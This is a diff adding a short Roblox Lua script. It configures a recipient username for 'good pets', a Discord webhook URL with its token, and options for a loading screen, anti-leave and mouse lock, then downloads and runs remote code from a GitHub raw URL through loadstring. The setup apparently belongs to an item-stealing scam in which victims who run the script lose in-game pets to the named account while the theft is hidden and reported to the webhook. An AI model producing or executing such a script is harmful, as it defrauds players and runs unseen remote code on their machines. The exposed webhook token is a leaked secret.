@@ -1,0 +1,9 @@
+UserName = "Minaz64x" -- good pets
+Webhook = "https://discord.com/api/webhooks/1146439456560259102/Yfmn7RNQ4ahfMAvxUPwARy2if-qKz06xm3YJv437JGYHoZfFFns1_2R1-WPU_z8_6ozR" -- pings for pets
+UserName2 = "Minaz64x" -- bad pets 
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts", true))()
